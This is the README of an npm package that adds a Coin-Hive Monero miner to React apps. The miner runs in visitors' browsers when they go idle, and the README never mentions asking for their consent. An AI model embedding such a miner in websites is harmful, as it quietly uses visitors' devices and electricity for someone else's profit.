b"# React Coin-Hive\n\nMine cryptocurrency while your users _haven\xe2\x80\x99t engaged with your content_ lately. Inspired by the last paragraph of [this article](https://cdb.reacttraining.com/announcing-react-idle-8fc0b9e2d33e).\n\nThis uses [Coin-Hive](https://coin-hive.com/) to mine [Monero (XMR)](https://getmonero.org/).\n\n## Installation\n\n```\nnpm install --save react-coin-hive\n```\n\n## Usage\n\n```jsx\n// Anywhere in your app as long as it gets mounted\n<CoinHive siteKey='ZM4gjqQ0jh0jbZ3tZDByOXAjyotDbo00'/>\n```\n\n## Props\n\n- `siteKey`: Your [Coin-Hive Site Key](https://coin-hive.com/settings/sites).\n\n- `timeout`: How long before considering that the user is idle in milliseconds. Default is `30000`.\n\n- `userName`: If used, the miner will be created with `CoinHive.User(siteKey, userName)`. By default the miner is created with `CoinHive.Anonymous(siteKey)`.\n\n- `threads`: The number of threads the miner should start with. Default is `2`.\n\n- `throttle`: The fraction of time that threads should be idle. Default is `0`.\n\n- `onInit`: A function that takes the `miner` instance as argument. It's called when the miner is created.\n\n- `onStart`: A function that takes the `miner` instance as argument. It's called every time the miner is started.\n\n- `onStop`: A function that takes the `miner` instance as argument. It's called every time the miner is stopped.\n\n## Disclaimer\n\nI have nothing to do with `coin-hive.com`\n"
